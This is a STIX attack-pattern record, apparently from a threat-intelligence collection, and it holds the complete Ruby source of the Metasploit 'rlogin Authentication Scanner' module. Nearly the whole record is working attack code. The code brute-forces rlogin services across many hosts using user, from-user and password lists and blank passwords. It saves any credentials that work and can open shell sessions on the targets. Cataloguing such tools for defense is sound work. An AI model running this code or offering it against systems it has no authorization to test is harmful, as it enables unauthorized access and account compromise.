{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--65fe21bb-1fd9-4c05-8df3-0528e07f3813",
    "created": "2024-08-14T16:27:18.171102Z",
    "modified": "2024-08-14T16:27:18.171109Z",
    "name": "rlogin Authentication Scanner",
    "description": " This module will test an rlogin service on a range of machines and report successful logins.  NOTE: This module requires access to bind to privileged ports (below 1024).  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/rservices/rlogin_login.rb",
            "external_id": "rlogin_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::RServices\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Login\n  include Msf::Auxiliary::CommandShell\n\n  def initialize\n    super(\n      'Name'        => 'rlogin Authentication Scanner',\n      'Description' => %q{\n          This module will test an rlogin service on a range of machines and\n        report successful logins.\n\n        NOTE: This module requires access to bind to privileged ports (below 1024).\n      },\n      'References' =>\n        [\n          [ 'CVE', '1999-0651' ],\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      'Author'      => [ 'jduck' ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(513),\n        OptString.new('TERM',  [ true, 'The terminal type desired', 'vt100' ]),\n        OptString.new('SPEED', [ true, 'The terminal speed desired', '9600' ])\n      ])\n  end\n\n  def run_host(ip)\n    print_status(\"#{ip}:#{rport} - Starting rlogin sweep\")\n\n    # We make a first connection to assess initial state of the service. If the\n    # service isn't available, we don't even bother to try further attempts against\n    # this host. Also, bind errors shouldn't happen and are treated as fatal here.\n    status = connect_from_privileged_port\n    return :abort if [ :refused, :bind_error ].include? status\n\n    begin\n      each_user_fromuser_pass { |user, fromuser, pass|\n        ret = try_user_pass(user, fromuser, pass, status)\n        status = nil\n        ret\n      }\n    rescue ::Rex::ConnectionError\n      nil\n    end\n  end\n\n  def each_user_fromuser_pass(&block)\n    # Class variables to track credential use (for threading)\n    @@credentials_tried = {}\n    @@credentials_skipped = {}\n\n    credentials = extract_word_pair(datastore['USERPASS_FILE'])\n\n    translate_proto_datastores()\n\n    users = load_user_vars(credentials)\n    fromusers = load_fromuser_vars()\n    passwords = load_password_vars(credentials)\n\n    cleanup_files()\n\n    if datastore['BLANK_PASSWORDS']\n      credentials = gen_blank_passwords(users, credentials)\n    end\n\n    credentials.concat(combine_users_and_passwords(users, passwords))\n    credentials.uniq!\n\n    # Okay, now we have a list of credentials to try. We want to merge in\n    # our list of from users for each user.\n    indexes = {}\n    credentials.map! { |u,p|\n      idx = indexes[u]\n      idx ||= 0\n\n      pa = nil\n      if idx >= fromusers.length\n        pa = [ nil, p ]\n      else\n        pa = [ fromusers[idx], p ]\n        indexes[u] = idx + 1\n      end\n      [ u, pa ]\n    }\n\n    # If there are more fromusers than passwords, append nil passwords, which will be handled\n    # specially by the login processing.\n    indexes.each_key { |u|\n      idx = indexes[u]\n      while idx < fromusers.length\n        credentials << [ u, [ fromusers[idx], nil ] ]\n        idx += 1\n      end\n    }\n    indexes = {}\n\n    # We do a second uniq! pass in case we added some dupes somehow\n    credentials.uniq!\n\n    fq_rest = \"%s:%s:%s\" % [datastore['RHOST'], datastore['RPORT'], \"all remaining users\"]\n\n    credentials.each do |u, fupw|\n      break if @@credentials_skipped[fq_rest]\n\n      fq_user = \"%s:%s:%s\" % [datastore['RHOST'], datastore['RPORT'], u]\n\n      userpass_sleep_interval unless @@credentials_tried.empty?\n\n      next if @@credentials_skipped[fq_user]\n      next if @@credentials_tried[fq_user] == fupw\n\n      fu,p = fupw\n      ret = block.call(u, fu, p)\n\n      case ret\n      when :abort # Skip the current host entirely.\n        break\n\n      when :next_user # This means success for that user.\n        @@credentials_skipped[fq_user] = fupw\n        if datastore['STOP_ON_SUCCESS'] # See?\n          @@credentials_skipped[fq_rest] = true\n        end\n\n      when :skip_user # Skip the user in non-success cases.\n        @@credentials_skipped[fq_user] = fupw\n\n      when :connection_error # Report an error, skip this cred, but don't abort.\n        vprint_error \"#{datastore['RHOST']}:#{datastore['RPORT']} - Connection error, skipping '#{u}':'#{p}' from '#{fu}'\"\n\n      end\n      @@credentials_tried[fq_user] = fupw\n    end\n  end\n\n\n  def try_user_pass(user, luser, pass, status = nil)\n    luser ||= 'root'\n\n    vprint_status \"#{rhost}:#{rport} rlogin - Attempting: '#{user}':#{pass.inspect} from '#{luser}'\"\n\n    this_attempt ||= 0\n    ret = nil\n    while this_attempt <= 3 and (ret.nil? or ret == :refused)\n      if this_attempt > 0\n        # power of 2 back-off\n        select(nil, nil, nil, 2**this_attempt)\n        vprint_error \"#{rhost}:#{rport} rlogin - Retrying '#{user}':#{pass.inspect} from '#{luser}' due to reset\"\n      end\n      ret = do_login(user, pass, luser, status)\n      this_attempt += 1\n    end\n\n    case ret\n    when :no_pass_prompt\n      vprint_status \"#{rhost}:#{rport} rlogin - Skipping '#{user}' due to missing password prompt\"\n      return :skip_user\n\n    when :busy\n      vprint_error \"#{rhost}:#{rport} rlogin - Skipping '#{user}':#{pass.inspect} from '#{luser}' due to busy state\"\n\n    when :refused\n      vprint_error \"#{rhost}:#{rport} rlogin - Skipping '#{user}':#{pass.inspect} from '#{luser}' due to connection refused.\"\n\n    when :skip_user\n      vprint_status \"#{rhost}:#{rport} rlogin - Skipping disallowed user '#{user}' for subsequent requests\"\n      return :skip_user\n\n    when :success\n      # session created inside do_login, ignore\n      return :next_user\n\n    else\n      if login_succeeded?\n        start_rlogin_session(rhost, rport, user, luser, pass, @trace)\n        return :next_user\n      end\n    end\n\n    # Default to returning whatever we got last..\n    ret\n  end\n\n\n  def do_login(user, pass, luser, status = nil)\n    # Reset our accumulators for interacting with /bin/login\n    @recvd = ''\n    @trace = ''\n\n    # We must connect from a privileged port. This only occurs when status\n    # is nil. That is, it only occurs when a connection doesn't already exist.\n    if not status\n      status = connect_from_privileged_port\n      return :refused if status == :refused\n    end\n\n    # Abort if we didn't get successfully connected.\n    return :abort if status != :connected\n\n    # Send the local/remote usernames and the desired terminal type/speed\n    sock.put(\"\\x00#{luser}\\x00#{user}\\x00#{datastore['TERM']}/#{datastore['SPEED']}\\x00\")\n\n    # Read the expected nul byte response.\n    buf = sock.get_once(1) || ''\n    return :abort if buf != \"\\x00\"\n\n    # NOTE: We report this here, since we are awfully convinced now that this is really\n    # an rlogin service.\n    report_service(\n      :host => rhost,\n      :port => rport,\n      :proto => 'tcp',\n      :name => 'login'\n    )\n\n    # Receive the initial response\n    Timeout.timeout(10) do\n      recv\n    end\n\n    if busy_message?\n      self.sock.close unless self.sock.closed?\n      return :busy\n    end\n\n    # If we're not trusted, we should get a password prompt. Otherwise, we might be in already :)\n    if login_succeeded?\n      # should we report a vuln here? rlogin allowed w/o password?!\n      print_good(\"#{target_host}:#{rport}, rlogin '#{user}' from '#{luser}' with no password.\")\n      start_rlogin_session(rhost, rport, user, luser, nil, @trace)\n      return :success\n    end\n\n    # no password to try, give up if luser isnt enough.\n    if not pass\n      vprint_error(\"#{target_host}:#{rport}, rlogin '#{user}' from '#{luser}' failed (no password to try)\")\n      return :fail\n    end\n\n    # Allow for slow echos\n    1.upto(10) do\n      recv(self.sock, 0.10) unless @recvd.nil? || password_prompt?(@recvd)\n    end\n\n    vprint_status(\"#{rhost}:#{rport} Prompt: #{@recvd.gsub(/[\\r\\n\\e\\b\\a]/, ' ')}\")\n\n    # Not successful yet, maybe we got a password prompt.\n    if password_prompt?(user)\n      send_pass(pass)\n\n      # Allow for slow echos\n      1.upto(10) do\n        recv(self.sock, 0.10)\n        break if login_succeeded?\n      end\n\n      vprint_status(\"#{rhost}:#{rport} Result: #{@recvd.gsub(/[\\r\\n\\e\\b\\a]/, ' ')}\")\n\n      if login_succeeded?\n        print_good(\"#{target_host}:#{rport}, rlogin '#{user}' successful with password #{pass.inspect}\")\n        start_rlogin_session(rhost, rport, user, nil, pass, @trace)\n        return :success\n      else\n        return :fail\n      end\n    else\n      if login_succeeded? && @recvd !~ /^#{user}\\x0d*\\x0a/\n        return :succeeded # intentionally not :success\n      else\n        self.sock.close unless self.sock.closed?\n        return :no_pass_prompt\n      end\n    end\n\n  # For debugging only.\n  #rescue ::Exception\n  #\tprint_error(\"#{$!}\")\n\n  ensure\n    disconnect()\n  end\n\n  def start_rlogin_session(host, port, user, luser, pass, proof)\n    service_data = {\n      address: host,\n      port: port,\n      service_name: 'rlogin',\n      proof: proof,\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      username: user\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    if pass\n      service_data.merge!(:pass => pass)\n      credential_data.merge!('PASSWORD' => pass)\n      info = \"RLOGIN #{user}:#{pass} (#{host}:#{port})\"\n    else\n      service_data.merge!(:luser => luser)\n      credential_data.merge!('FROMUSER'=> luser)\n      info = \"RLOGIN #{user} from #{luser} (#{host}:#{port})\"\n    end\n\n    create_credential_login(login_data)\n    if datastore['CreateSession']\n      start_session(self, info, login_data, false, self.sock)\n      # Don't tie the life of this socket to the exploit\n      self.sock = nil\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ jduck ]",
        ""
    ]
}